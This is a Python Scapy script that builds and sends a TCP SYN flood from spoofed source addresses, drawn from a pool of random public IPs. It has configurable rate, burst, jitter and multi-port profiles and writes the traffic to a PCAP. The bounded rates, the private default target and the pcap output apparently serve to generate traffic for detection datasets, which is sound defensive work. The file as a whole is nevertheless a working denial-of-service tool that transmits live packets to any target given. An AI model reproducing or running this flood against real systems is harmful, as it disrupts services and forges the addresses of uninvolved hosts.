import argparse
import ipaddress
import math
import random
import time

from scapy.all import IP, TCP, send, wrpcap


PROFILES = {
    "low_steady": {"pps": 50, "duration": 20.0, "spoof_pool_size": 1000, "target_ports": (80,)},
    "medium_steady": {"pps": 150, "duration": 10.0, "spoof_pool_size": 1500, "target_ports": (80,)},
    "high_steady": {"pps": 400, "duration": 5.0, "spoof_pool_size": 2000, "target_ports": (443,)},
    "bursty": {"pps": 180, "duration": 12.0, "spoof_pool_size": 1500, "target_ports": (80,), "burst_size": 30, "burst_gap": 0.2},
    "jittered": {"pps": 90, "duration": 18.0, "spoof_pool_size": 1200, "target_ports": (443,), "jitter": 0.004},
    "multi_port": {"pps": 150, "duration": 10.0, "spoof_pool_size": 1500, "target_ports": (80, 443, 8080)},
}
DEFAULTS = {
    "target": "10.10.0.3",
    "port": 80,
    "target_ports": None,
    "pps": 150,
    "duration": 10,
    "spoof_pool_size": 1500,
    "jitter": 0.0,
    "burst_size": 0,
    "burst_gap": 0.0,
    "seed": None,
    "profile": None,
    "output": "/pcaps/syn_flood_candidate.pcap",
}


def parse_ports(value):
    try:
        ports = tuple(int(port) for port in value.split(",") if port)
    except ValueError as error:
        raise argparse.ArgumentTypeError("--target-ports must be comma-separated integers") from error
    if not ports or any(not 1 <= port <= 65535 for port in ports):
        raise argparse.ArgumentTypeError("--target-ports must contain ports between 1 and 65535")
    return ports


def random_source_ip(victim_ip, rng=None):
    randomizer = rng or random
    while True:
        source_ip = ipaddress.IPv4Address(randomizer.getrandbits(32))
        if source_ip.is_global and source_ip != victim_ip:
            return str(source_ip)


def build_spoof_pool(victim_ip, pool_size, rng=None):
    randomizer = rng or random
    pool = []
    identities = set()
    while len(pool) < pool_size:
        source_ip = random_source_ip(victim_ip, randomizer) if rng else random_source_ip(victim_ip)
        source_port = randomizer.randint(1024, 65535)
        identity = (source_ip, source_port)
        if identity not in identities:
            identities.add(identity)
            pool.append(identity)
    return pool


def apply_profile(args):
    profile = getattr(args, "profile", None)
    values = DEFAULTS | (PROFILES[profile] if profile else {}) | vars(args)
    for name, value in values.items():
        setattr(args, name, value)


def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="Generate a TCP SYN flood PCAP with spoofed source addresses.",
        argument_default=argparse.SUPPRESS,
    )
    parser.add_argument("--target", help="Target IPv4 address")
    parser.add_argument("--port", type=int, help="Target TCP port")
    parser.add_argument("--target-ports", type=parse_ports, help="Comma-separated target TCP ports")
    parser.add_argument("--pps", type=int, help="Packets per second")
    parser.add_argument("--duration", type=float, help="Flood duration in seconds")
    parser.add_argument("--spoof-pool-size", type=int, help="Number of spoofed source identities")
    parser.add_argument("--jitter", type=float, help="Maximum timing jitter in seconds")
    parser.add_argument("--burst-size", type=int, help="Packets per burst, or zero for steady traffic")
    parser.add_argument("--burst-gap", type=float, help="Pause after each burst in seconds")
    parser.add_argument("--seed", type=int, help="Seed for reproducible packet structure")
    parser.add_argument("--profile", choices=tuple(PROFILES), help="Bounded SYN-flood traffic profile")
    parser.add_argument("--output", help="Output PCAP file")
    args = parser.parse_args(argv)
    apply_profile(args)

    try:
        victim_ip = ipaddress.IPv4Address(args.target)
    except ipaddress.AddressValueError:
        parser.error("--target must be a valid IPv4 address")

    if not 1 <= args.port <= 65535:
        parser.error("--port must be between 1 and 65535")
    if args.pps <= 0:
        parser.error("--pps must be greater than zero")
    if args.duration <= 0:
        parser.error("--duration must be greater than zero")
    if args.spoof_pool_size <= 0:
        parser.error("--spoof-pool-size must be greater than zero")
    if args.jitter < 0:
        parser.error("--jitter must be zero or greater")
    if args.burst_size < 0:
        parser.error("--burst-size must be zero or greater")
    if args.burst_gap < 0:
        parser.error("--burst-gap must be zero or greater")
    args.target_ports = tuple(args.target_ports or (args.port,))
    return args


def build_packets(target, port, pps, duration, spoof_pool, target_ports=None, jitter=0.0, burst_size=0, burst_gap=0.0, rng=None):
    randomizer = rng or random
    ports = tuple(target_ports or (port,))
    packet_count = math.ceil(pps * duration)
    interval = 1 / pps
    timestamp = 0.0
    packets = []
    for sent in range(packet_count):
        source_ip, source_port = spoof_pool[sent % len(spoof_pool)]
        packet = IP(src=source_ip, dst=target) / TCP(
            sport=source_port, dport=ports[sent % len(ports)], flags="S"
        )
        packet.time = timestamp
        packets.append(packet)
        timestamp += max(0.000001, interval + randomizer.uniform(-jitter, jitter)) if jitter else interval
        if burst_size and (sent + 1) % burst_size == 0:
            timestamp += burst_gap
    return packets


def main():
    args = parse_args()
    victim_ip = ipaddress.IPv4Address(args.target)
    rng = random.Random(args.seed) if args.seed is not None else None
    spoof_pool = build_spoof_pool(victim_ip, args.spoof_pool_size, rng)
    packets = build_packets(
        args.target,
        args.port,
        args.pps,
        args.duration,
        spoof_pool,
        target_ports=args.target_ports,
        jitter=args.jitter,
        burst_size=args.burst_size,
        burst_gap=args.burst_gap,
        rng=rng,
    )
    print(f"Sending SYN flood to {args.target}:{','.join(map(str, args.target_ports))} at {args.pps} PPS for {args.duration:g} seconds.")
    for index, packet in enumerate(packets):
        send(packet, verbose=False)
        if index + 1 < len(packets):
            pause = max(0.0, float(packets[index + 1].time) - float(packet.time))
            if pause:
                time.sleep(pause)
    wrpcap(args.output, packets)
    print(f"Completed SYN flood. Sent {len(packets)} packets across {len(spoof_pool)} spoofed identities; wrote pcap to {args.output}.")


if __name__ == "__main__":
    main()
